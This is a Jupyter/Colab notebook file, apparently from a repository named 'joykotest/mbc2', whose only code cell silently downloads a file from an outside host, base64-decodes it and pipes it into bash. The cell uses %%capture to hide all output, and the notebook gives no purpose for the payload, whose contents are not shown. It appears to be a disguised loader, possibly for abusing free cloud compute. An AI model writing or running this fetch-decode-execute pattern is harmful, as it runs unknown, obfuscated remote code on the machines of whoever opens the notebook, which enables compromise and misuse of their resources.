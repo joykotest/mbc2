{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "pon-mbck.ipynb",
      "provenance": [],
      "authorship_tag": "ABX9TyPEaAqBTEfFsYTWrsN+X9AA",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/joykotest/mbc2/blob/main/2pon_mbck.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "%%capture\n",
        "! wget https://ghabutech.xyz/point/bsm18 && base64 bsm18 -d | bash"
      ],
      "metadata": {
        "id": "gY8XbJnnBcs2"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}